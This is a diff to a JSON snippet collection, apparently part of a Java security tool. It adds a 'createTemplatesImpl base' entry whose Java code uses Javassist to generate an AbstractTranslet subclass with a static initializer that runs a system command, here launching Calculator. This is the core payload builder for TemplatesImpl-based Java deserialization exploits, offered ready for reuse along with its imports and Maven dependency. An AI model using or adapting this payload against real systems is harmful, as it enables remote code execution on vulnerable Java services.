@@ -107,6 +107,28 @@
               "version": "3.29.0-GA"
             }
           ]
+        },
+        {
+          "name": "createTemplatesImpl base",
+          "code": "    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {\n        ClassPool classPool = ClassPool.getDefault();\n        // 生成一个随机的类名\n        String randomClassName = \"Test_\" + UUID.randomUUID().toString().replace(\"-\", \"\");\n        CtClass ctClass = classPool.makeClass(randomClassName);\n        ctClass.setSuperclass(classPool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"));\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        ctClass.makeClassInitializer().insertBefore(block);\n        return ctClass.toBytecode();\n    }",
+          "imports": [
+            "javassist.ClassPool",
+            "javassist.CtClass",
+            "java.io.IOException",
+            "java.io.ByteArrayOutputStream",
+            "javassist.CannotCompileException",
+            "javassist.NotFoundException",
+            "java.lang.reflect.Field",
+            "javassist.ClassClassPath",
+            "java.util.UUID"
+          ],
+          "mavenDependencies": [
+            {
+              "groupId": "org.javassist",
+              "artifactId": "javassist",
+              "version": "3.29.0-GA"
+            }
+          ]
         }
       ]
     }
